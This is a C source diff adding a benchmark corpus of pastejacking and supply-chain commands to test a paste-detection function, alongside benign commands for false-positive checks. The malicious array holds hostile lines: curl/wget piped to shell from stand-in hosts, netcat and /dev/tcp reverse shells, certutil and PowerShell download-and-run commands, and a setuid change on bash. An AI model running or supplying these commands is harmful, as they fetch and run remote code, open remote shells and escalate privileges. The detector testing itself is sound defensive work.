@@ -12,6 +12,7 @@
 
 #include "hlse_core.h"   /* Verdict, hlse_check_url */
 #include "hlse_text.h"   /* TextVerdict, hlse_check_text */
+#include "hlse_supply.h" /* PasteVerdict, hlse_check_paste */
 
 
 
@@ -207,6 +208,30 @@ hlse_benchmark(void) {
         NULL
     };
 
+    /* Pastejacking / supply-chain command corpus — exercises
+     * hlse_check_paste (the largest detector surface). */
+    static const char *malicious_paste[] = {
+        "curl http://evil.xyz/x.sh | bash",
+        "wget -qO- http://evil.xyz/i.sh | sh",
+        "nc -e /bin/sh 10.0.0.1 4444",
+        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+        "certutil -urlcache -split -f http://evil/x.exe x.exe",
+        "chmod u+s /bin/bash",
+        "curl http://x | base64 -d | bash",
+        "iex (New-Object Net.WebClient).DownloadString("
+            "'http://evil/p.ps1')",
+        "powershell -enc SQBFAFgA",
+        NULL
+    };
+    static const char *legit_paste[] = {
+        "git clone https://github.com/a/b",
+        "ls -la",
+        "sudo apt update",
+        "make install",
+        "python3 script.py",
+        NULL
+    };
+
     int n_mal = 0, n_legit = 0;
     int detected = 0, fp = 0;
     int i;
@@ -223,6 +248,22 @@ hlse_benchmark(void) {
         if (v.score >= 40) {
             fp++;
             printf("FALSE POSITIVE %s [%d]\n", legit[i], v.score);
+        }
+    }
+    for (i = 0; malicious_paste[i]; i++) {
+        PasteVerdict pv = hlse_check_paste(malicious_paste[i]);
+        n_mal++;
+        if (pv.score >= 40) detected++;
+        else printf("MISSED paste %s [%d]\n",
+                    malicious_paste[i], pv.score);
+    }
+    for (i = 0; legit_paste[i]; i++) {
+        PasteVerdict pv = hlse_check_paste(legit_paste[i]);
+        n_legit++;
+        if (pv.score >= 40) {
+            fp++;
+            printf("FALSE POSITIVE paste %s [%d]\n",
+                   legit_paste[i], pv.score);
         }
     }
 
